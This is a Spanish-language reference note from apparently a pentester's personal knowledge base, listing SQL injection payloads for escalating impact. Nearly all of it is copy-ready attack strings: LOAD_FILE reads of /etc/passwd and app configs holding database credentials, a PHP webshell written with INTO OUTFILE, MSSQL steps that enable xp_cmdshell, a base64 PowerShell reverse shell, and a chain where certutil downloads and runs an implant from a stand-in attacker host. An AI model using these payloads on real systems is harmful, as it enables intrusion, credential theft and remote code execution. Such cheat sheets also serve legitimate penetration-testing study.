---
tipo: meta
visibilidad: publica
creado: 2026-08-06
aliases:
  - Payloads impacto SQLi
  - SQLi RCE
tags:
  - meta/referencia
  - dominio/web
---

# SQLi impacto - matriz de referencia

> [!info] Referencia pura, no un zettel
> El impacto es un eje aparte del canal: primero se extrae, después se escala. El criterio de cada vía está en [[SQLi - lectura de archivos en MySQL]] y [[SQLi - stacked queries en MSSQL]]. `yi``  ` copia el payload.

## Lectura de archivos — MySQL

Requiere `secure_file_priv` permisivo (vacío o ruta) y privilegio `FILE`. Confirmar antes con la sección de privilegios de [[SQLi UNION - matriz de referencia]].

`' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -`
Lectura arbitraria por el canal UNION.

`' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -`
Config de la app: suele traer credenciales de la base en claro.

`' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE('/etc/hostname'))))-- -`
Misma lectura por el canal error-based cuando no hay UNION.

## Escritura de archivos — MySQL

`' UNION SELECT 'test',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -`
Prueba de escritura. Verificar antes de la webshell.

`' UNION SELECT '<?php system($_GET[0]);?>',NULL INTO OUTFILE '/var/www/html/sh.php'-- -`
Webshell PHP → RCE. Después: `curl 'http://objetivo/sh.php?0=id'`.

`... INTO OUTFILE '/var/www/html/sh.php'`  vs  `... INTO DUMPFILE ...`
`OUTFILE` agrega formato de tabla; `DUMPFILE` escribe el binario crudo — usar `DUMPFILE` para subir un binario o un `.so`.

## Stacked queries — MSSQL

Requiere que el driver permita apilar (`;` + segunda consulta). Común en MSSQL/PostgreSQL, no en MySQL con la mayoría de los drivers.

`'; SELECT 1-- -`
Confirmar que se puede apilar: si no da error, el `;` está habilitado.

`'; EXEC sp_configure 'show advanced options',1; RECONFIGURE-- -`
Paso 1 para habilitar xp_cmdshell.

`'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -`
Paso 2: habilita la ejecución de comandos.

`'; EXEC xp_cmdshell 'whoami'-- -`
Ejecución de comandos del SO. Ciego: la salida no vuelve por HTTP, se combina con OOB o se escribe a una tabla y se lee.

`'; EXEC xp_cmdshell 'powershell -e <base64>'-- -`
Reverse shell: encodear el one-liner de PowerShell en base64.

## Escalada por la cuenta de BD

`' UNION SELECT super_priv,NULL FROM mysql.user WHERE user=current_user()-- -`
MySQL: ¿la cuenta es admin? Determina si `FILE`/escritura es posible.

`'; SELECT IS_SRVROLEMEMBER('sysadmin')-- -`
MSSQL: ¿sysadmin? Sin eso, `sp_configure` falla.

## Ejemplo — de SQLi a RCE en MSSQL

```
1. '; SELECT 1-- -                                          → sin error: se puede apilar
2. '; SELECT IS_SRVROLEMEMBER('sysadmin')-- -               → 1 (vía booleano/OOB): somos sysadmin
3. '; EXEC sp_configure 'show advanced options',1;RECONFIGURE-- -
4. '; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -
5. '; EXEC xp_cmdshell 'certutil -urlcache -f http://atacante/x.exe %TEMP%\x.exe & %TEMP%\x.exe'-- -
   → descarga y ejecuta el implante
```

## Relacionadas

[[SQLi - lectura de archivos en MySQL]] · [[SQLi - stacked queries en MSSQL]] · [[MOC - SQL injection]] · [[Dialectos SQL - matriz de referencia]]
